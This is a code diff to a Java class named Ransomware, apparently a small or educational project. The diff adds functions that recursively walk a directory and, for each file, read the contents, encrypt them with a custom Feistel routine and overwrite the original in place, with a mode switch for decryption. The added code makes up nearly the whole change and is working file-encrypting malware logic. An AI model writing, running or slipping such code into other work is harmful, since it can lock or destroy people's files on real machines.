@@ -1,8 +1,11 @@
+import java.io.File;
+import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.CharBuffer;
 import java.nio.IntBuffer;
-
+import java.nio.file.Files;
+import java.nio.file.Path;
 
 public class Ransomware {
 
@@ -11,21 +14,56 @@ public class Ransomware {
         Decrypt
     }
 
+    static private Mode mode = Mode.Encrypt;
+
+    public static void setMode(Mode mode) {
+        Ransomware.mode = mode;
+    }
+
+    private static void processDirectory(File directory) throws IOException {
+        String[] directories = directory.list();
+        for (String s : directories) {
+            File newFile = Path.of(directory.getAbsolutePath(), s).toFile();
+            if (newFile.isDirectory()) {
+                processDirectory(newFile);
+            } else {
+                processFile(newFile);
+            }
+        }
+    }
+
+    private static void processFile(File file) throws IOException {
+        Path path = file.toPath();
+        String fileContent = Files.readString(path);
+        String encryptedContent = process(fileContent, Ransomware.mode);
+        Files.writeString(path, encryptedContent);
+        String prefix = Ransomware.mode == Ransomware.Mode.Encrypt ? "Encrypted " : "Decrypted ";
+        System.out.println(prefix + file.getAbsolutePath());
+    }
+
+    public static void initialize(Path path) throws IOException {
+        File file = path.toFile();
+        if (file.isDirectory()) {
+            processDirectory(file);
+        } else {
+            processFile(file);
+        }
+    }
+
     public static String process(String message, Mode mode) {
         if (mode == Mode.Encrypt) {
             message = checkAndPad(message);
         }
 
-    
         int[] messageBytes = convertCharArrayToIntArray(message.toCharArray());
-        
+
         int[] data = switch (mode) {
-            case Encrypt -> FesitelAlgorithm.encrypt(messageBytes);
-            case Decrypt -> FesitelAlgorithm.decrypt(messageBytes);
+            case Encrypt -> FesitelAlgorithm.encryptData(messageBytes);
+            case Decrypt -> FesitelAlgorithm.decryptData(messageBytes);
         };
-    
+
         String response = new String(convertIntArrayToCharArray(data));
-        if(mode == Mode.Decrypt) {
+        if (mode == Mode.Decrypt) {
             response.trim();
         }
 
@@ -59,7 +97,6 @@ public class Ransomware {
         charBuffer.get(charArray);
         return charArray;
     }
-    
 
     private static int[] convertCharArrayToIntArray(char[] data) {
         ByteBuffer byteBuffer = ByteBuffer.allocate(data.length * 2);
@@ -74,5 +111,5 @@ public class Ransomware {
         intBuffer.get(intArray);
         return intArray;
     }
-    
+
 }
